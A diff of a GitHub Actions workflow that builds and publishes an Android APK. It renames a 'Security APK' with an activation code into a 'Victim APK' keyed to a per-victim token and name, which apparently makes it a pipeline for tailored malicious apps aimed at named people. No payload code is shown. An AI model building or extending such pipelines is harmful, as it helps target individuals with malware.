@@ -1,14 +1,18 @@
-name: Build Security APK
+name: Build Victim APK
 
 on:
   push:
-    branches: [ main ]
+    branches: [main]
   workflow_dispatch:
     inputs:
-      activation_code:
-        description: 'Activation Code'
+      victim_token:
+        description: 'Victim Token'
+        required: true
+        default: 'DEFAULT_TOKEN'
+      victim_name:
+        description: 'Victim Name'
         required: false
-        default: 'DEFAULT'
+        default: 'Unknown'
 
 permissions:
   contents: write
@@ -16,82 +20,82 @@ permissions:
 jobs:
   build:
     runs-on: ubuntu-latest
-
+    
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-
+      
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
           distribution: 'temurin'
           java-version: '17'
-
+      
       - name: Setup Android SDK
         run: |
-          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
-          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true
+          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true
           $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager "platforms;android-33" "build-tools;33.0.1" > /dev/null 2>&1 || true
-
+      
       - name: Setup Gradle
         uses: gradle/actions/setup-gradle@v3
         with:
           gradle-version: '8.2'
           cache-disabled: true
-
-      - name: Prepare activation code
+      
+      - name: Prepare tokens
         id: prep
         run: |
           if [ "${{ github.event_name }}" == "workflow_dispatch" ]; then
-            CODE="${{ github.event.inputs.activation_code }}"
+            TOKEN="${{ github.event.inputs.victim_token }}"
+            NAME="${{ github.event.inputs.victim_name }}"
           else
-            CODE="DEFAULT"
+            TOKEN="DEFAULT_TOKEN"
+            NAME="Unknown"
           fi
           
-          if [ -z "$CODE" ]; then
-            CODE="DEFAULT"
-          fi
+          if [ -z "$TOKEN" ]; then TOKEN="DEFAULT_TOKEN"; fi
+          if [ -z "$NAME" ]; then NAME="Unknown"; fi
           
-          echo "code=$CODE" >> $GITHUB_OUTPUT
-          echo "===== Using Activation Code: $CODE ====="
-
+          echo "token=$TOKEN" >> $GITHUB_OUTPUT
+          echo "name=$NAME" >> $GITHUB_OUTPUT
+          echo "short=$(echo $TOKEN | cut -c1-16)" >> $GITHUB_OUTPUT
+          echo "==== TOKEN: $TOKEN ===="
+          echo "==== NAME: $NAME ===="
+      
       - name: Build APK
         env:
-          ACTIVATION_CODE: ${{ steps.prep.outputs.code }}
+          VICTIM_TOKEN: ${{ steps.prep.outputs.token }}
         run: |
-          echo "Building with ACTIVATION_CODE=${ACTIVATION_CODE}"
+          echo "Building with VICTIM_TOKEN=${VICTIM_TOKEN}"
           gradle assembleDebug \
-            -PactivationCode="${ACTIVATION_CODE}" \
+            -PvictimToken="${VICTIM_TOKEN}" \
             -Dorg.gradle.jvmargs="-Xmx2048m" \
-            --no-daemon --stacktrace
-
-      - name: Verify BuildConfig
-        run: |
-          echo "===== Checking BuildConfig ====="
-          find . -name "BuildConfig.java" -path "*debug*" -exec cat {} \; 2>/dev/null | head -50
-
+            --no-daemon \
+            --stacktrace
+      
       - name: Rename APK
         run: |
           mkdir -p output
-          cp app/build/outputs/apk/debug/app-debug.apk output/SecurityCheck_${{ steps.prep.outputs.code }}.apk
+          cp app/build/outputs/apk/debug/app-debug.apk "output/Victim_${{ steps.prep.outputs.name }}_${{ steps.prep.outputs.short }}.apk"
           ls -la output/
-
-      - name: Upload APK as Artifact
+      
+      - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: SecurityCheck-${{ steps.prep.outputs.code }}
+          name: Victim-${{ steps.prep.outputs.short }}
           path: output/*.apk
           retention-days: 30
-
+      
       - name: Create Release
         uses: softprops/action-gh-release@v1
         with:
-          tag_name: build-${{ github.run_number }}-${{ steps.prep.outputs.code }}
-          name: APK ${{ steps.prep.outputs.code }}
+          tag_name: victim-${{ github.run_number }}-${{ steps.prep.outputs.short }}
+          name: Victim ${{ steps.prep.outputs.name }} - ${{ steps.prep.outputs.short }}
           body: |
-            ## Security APK
-            Activation Code: `${{ steps.prep.outputs.code }}`
-            Build: #${{ github.run_number }}
+            ## Victim APK
+            Victim: ${{ steps.prep.outputs.name }}
+            Token: ${{ steps.prep.outputs.short }}...
+            Build: ${{ github.run_number }}
           files: output/*.apk
           draft: false
           prerelease: false
